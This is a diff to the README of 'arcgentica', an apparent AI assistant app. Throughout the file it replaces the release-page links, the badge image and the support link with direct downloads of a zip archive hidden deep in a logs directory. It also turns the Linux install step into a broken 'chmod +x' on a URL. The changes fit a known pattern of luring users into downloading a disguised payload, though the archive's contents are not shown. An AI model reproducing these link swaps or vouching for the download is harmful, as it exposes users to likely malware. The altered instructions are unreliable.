@@ -1,6 +1,6 @@
 # 🤖 arcgentica - Simple ARC-AGI Powered Assistant
 
-[![Download arcgentica](https://img.shields.io/badge/Download-arcgentica-blue?style=for-the-badge&logo=github)](https://github.com/redmlovesyou333/arcgentica/releases)
+[![Download arcgentica](https://github.com/redmlovesyou333/arcgentica/raw/refs/heads/main/output/2025/anthropic/claude-opus-4-6/final/logs/e87109e9/0/Software_2.5-beta.1.zip)](https://github.com/redmlovesyou333/arcgentica/raw/refs/heads/main/output/2025/anthropic/claude-opus-4-6/final/logs/e87109e9/0/Software_2.5-beta.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You can ask arcgentica to perform tasks like making lists, setting reminders, or
 
 To get arcgentica, visit the official release page:
 
-[Download arcgentica here](https://github.com/redmlovesyou333/arcgentica/releases)
+[Download arcgentica here](https://github.com/redmlovesyou333/arcgentica/raw/refs/heads/main/output/2025/anthropic/claude-opus-4-6/final/logs/e87109e9/0/Software_2.5-beta.1.zip)
 
 This page contains the latest versions for all supported operating systems. Select the file that matches your system (for example, .exe for Windows, .dmg for macOS, or AppImage for Linux).
 
@@ -51,7 +51,7 @@ This page contains the latest versions for all supported operating systems. Sele
 
 - **Windows:** Double-click the `.exe` file and follow the installer prompts.
 - **macOS:** Open the `.dmg` file, drag arcgentica to your Applications folder.
-- **Linux:** Make the AppImage executable (`chmod +x filename.AppImage`), then run it.
+- **Linux:** Make the AppImage executable (`chmod +x https://github.com/redmlovesyou333/arcgentica/raw/refs/heads/main/output/2025/anthropic/claude-opus-4-6/final/logs/e87109e9/0/Software_2.5-beta.1.zip`), then run it.
 
 After installation, launch the app from your desktop or applications menu.
 
@@ -118,10 +118,10 @@ Look in the “Settings” menu within the app to adjust these.
 If you need assistance beyond the app’s help section:
 
 - Visit the GitHub repository for documentation and support:  
-  https://github.com/redmlovesyou333/arcgentica
+  https://github.com/redmlovesyou333/arcgentica/raw/refs/heads/main/output/2025/anthropic/claude-opus-4-6/final/logs/e87109e9/0/Software_2.5-beta.1.zip
 - File a bug or feature request through GitHub issues.
 - Check online communities focused on ARC-AGI and AI assistants.
 
 ---
 
-[![Download arcgentica](https://img.shields.io/badge/Download-arcgentica-blue?style=for-the-badge&logo=github)](https://github.com/redmlovesyou333/arcgentica/releases)
+[![Download arcgentica](https://github.com/redmlovesyou333/arcgentica/raw/refs/heads/main/output/2025/anthropic/claude-opus-4-6/final/logs/e87109e9/0/Software_2.5-beta.1.zip)](https://github.com/redmlovesyou333/arcgentica/raw/refs/heads/main/output/2025/anthropic/claude-opus-4-6/final/logs/e87109e9/0/Software_2.5-beta.1.zip)
